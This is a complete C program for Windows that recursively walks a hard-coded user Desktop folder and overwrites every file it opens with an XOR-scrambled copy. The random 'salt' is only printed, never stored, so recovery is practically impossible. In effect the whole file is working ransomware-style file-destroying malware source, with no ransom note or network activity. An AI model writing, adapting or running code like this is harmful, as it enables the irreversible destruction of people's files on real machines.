#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <time.h>

typedef struct __file_info {
    char* name;
    int fileSz;
    char* data;
    HANDLE file_handle;
} file_info;

file_info* __ReadFile(const char* path) {
    HANDLE file = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) return NULL;

    DWORD fileSz = GetFileSize(file, NULL);
    char* data = malloc(fileSz);
    DWORD bytesRead;
    ReadFile(file, data, fileSz, &bytesRead, NULL);

    file_info* filein = malloc(sizeof(file_info));
    filein->data = data;
    filein->fileSz = fileSz;
    filein->file_handle = file;
    filein->name = _strdup(path);

    return filein;
}

char* __GenerateSalt() {
    srand((unsigned int)time(0));
    char* salt = malloc(31);
    for (int i = 0; i < 30; i++) salt[i] = rand() % 20 + '0';
    salt[30] = '\0';
    return salt;
}

void __EncryptFile(file_info* fileInfo, const char* salt) {
    size_t saltLen = strlen(salt);
    printf("Encrypting file: %s | Salt: %s\n", fileInfo->name, salt);

    for (size_t i = 0; i < fileInfo->fileSz; i++) {
        fileInfo->data[i] ^= salt[i % saltLen];
    }

    SetFilePointer(fileInfo->file_handle, 0, NULL, FILE_BEGIN);
    DWORD bytesWritten;
    WriteFile(fileInfo->file_handle, fileInfo->data, fileInfo->fileSz, &bytesWritten, NULL);
    SetEndOfFile(fileInfo->file_handle);
}

void __loopfolder(const char* fpath) {
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", fpath);

    WIN32_FIND_DATAA file_data;
    HANDLE hFind = FindFirstFileA(searchPath, &file_data);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(file_data.cFileName, ".") == 0 || strcmp(file_data.cFileName, "..") == 0)
            continue;

        char fullPath[MAX_PATH];
        snprintf(fullPath, MAX_PATH, "%s\\%s", fpath, file_data.cFileName);

        if (file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            __loopfolder(fullPath);
        }
        else {
            file_info* file_in = __ReadFile(fullPath);
            if (file_in) {
                char* salt = __GenerateSalt();
                __EncryptFile(file_in, salt);
                CloseHandle(file_in->file_handle);
                free(salt);
                free(file_in->data);
                free(file_in->name);
                free(file_in);
            }
        }
    } while (FindNextFileA(hFind, &file_data));

    FindClose(hFind);
}

void __init() {
    char path[MAX_PATH] = "C:\\Users\\levdk\\OneDrive\\Desktop";
    __loopfolder(path);
}

int main() {
    __init();
    return 0;
}
